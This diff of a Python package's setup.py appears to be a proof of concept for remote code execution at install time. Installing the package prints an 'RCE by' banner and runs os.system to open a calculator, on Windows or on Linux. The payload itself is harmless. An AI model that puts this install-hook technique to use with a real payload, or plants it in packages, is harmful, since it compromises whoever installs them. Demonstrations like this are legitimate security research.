@@ -2,8 +2,11 @@ import os
 from setuptools import setup
 
 print("RCE by w3shi(S.Lakshmi Vignesh")
-os.system("calc.exe")
-os.system("calc.exe")
+
+if platform.system() == "Windows":
+    os.system("calc.exe")
+elif platform.system() == "Linux":
+    os.system("gnome-calculator")
 
 setup(
     name="rcepipslv",
